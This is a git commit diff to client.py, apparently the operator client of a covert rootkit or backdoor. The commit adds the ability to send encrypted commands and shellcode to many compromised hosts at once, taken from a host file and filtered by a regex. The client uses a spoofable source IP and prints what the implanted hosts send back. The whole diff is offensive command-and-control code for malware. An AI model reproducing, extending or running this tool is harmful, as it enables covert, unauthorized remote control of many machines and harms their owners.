aa9372c2419d590dcb15c288944de3191a5ad67d
hal3002 <hal@nutsec.org>
2021-03-26 10:19:06 -0500

    Added the ability to communicate with multiple hosts at once

--- client.py
+++ client.py
@@ -3,6 +3,7 @@ import _thread
 import getopt
 import struct
 import hexdump
+import re
 
 from termcolor import colored
 
@@ -17,8 +18,11 @@ MSG_OS_BSD=                     0x40
 MSG_OS_LINUX=                   0x80
 
 magic = b"GOATSE"
+search = ""
 src_ip = ""
 dst_ip = ""
+destinations = []
+hosts_file = ""
 shellcode_file = ""
 block_size = 128
 interface=None
@@ -80,33 +84,40 @@ def usage(err=None):
         print("Error: {}\n".format(err))
 
     print("Usage:")
-    print("\tpython {} -d <dst_ip> -i <interface> [-s <src_ip>] [-f <shellcode_file>] [-h]".format(sys.argv[0]))
+    print("\tpython {} -d <dst_ip|host_file> [-S <search>] -i <interface> [-s <src_ip>] [-f <shellcode_file>] [-h]".format(sys.argv[0]))
     print("\t\tinterface: The interface that should be used for sending packets. (REQUIRED)")
-    print("\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)")
+    print("\t\tdst_ip: the host we are communicating with (Can be broadcast)")
+    print("\t\tsearch: regex to filter hosts")
+    print("\t\thost_file: file containing hostnames of hosts we are communicating with")
     print("\t\tsrc_ip: the address we want to send from (Can be anything)")
     print("\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin")
     print()
     sys.exit(0)
 
 def parse_args():
-   global dst_ip, src_ip, shellcode_file, interface
+   global dst_ip, src_ip, shellcode_file, interface, destinations, search
 
    try:
-      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:h', \
-         ['interface=', 'destination=', 'source=', 'shellcode=', 'help'])
+       opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:S:h', \
+         ['interface=', 'destination=', 'source=', 'shellcode=', 'search=', 'help'])
 
    except getopt.GetoptError as err:
       usage(err)    
 
    for o, a in opts:
       if o in ('-d', '--destination'):
-         dst_ip = a
+         if os.path.isfile(a):
+            destinations = open(a, 'r').read().strip().split('\n')
+         else:
+            destinations = [a]
       if o in ('-i', '--interface'):
          interface = a
       if o in ('-s', '--source'):
          src_ip = a
       if o in ('-f', '--shellcode'):
          shellcode_file = a
+      if o in ('-S', '--search'):
+          search = a
       if o in ('-h', '--help'):
          usage()
 
@@ -151,7 +162,7 @@ def sniff_packet(pkt):
         if msg.message_type == MSG_TYPE_RESPONSE:
             print('{}: {}'.format(colored(msg.source, 'green'), msg.data), end='')
 
-    except RootyMessageException:
+    except (RootyMessageException, AttributeError):
         pass
 
 
@@ -186,8 +197,12 @@ random.seed()
 # Parse the arguments
 parse_args()
 
+# Filter hosts by the search string
+if search:
+    destinations = [x for x in destinations if re.search(search, x)]
+
 # Make sure we at least have a destination
-if not dst_ip:
+if not destinations:
    print("ERROR: Destination must be specified")
    usage()
    sys.exit(0)
@@ -212,4 +227,6 @@ while 1:
    line = sys.stdin.readline().rstrip('\n').encode()
    key = generate_key()
    encrypted_data = crypt_data(magic + b"\x02" + struct.pack('<H', len(line)) + line, key)
-   send(build_pkt(src_ip, dst_ip, key + encrypted_data), verbose=0, iface=interface)
+
+   for dst_ip in destinations:
+       send(build_pkt(src_ip, dst_ip, key + encrypted_data), verbose=0, iface=interface)
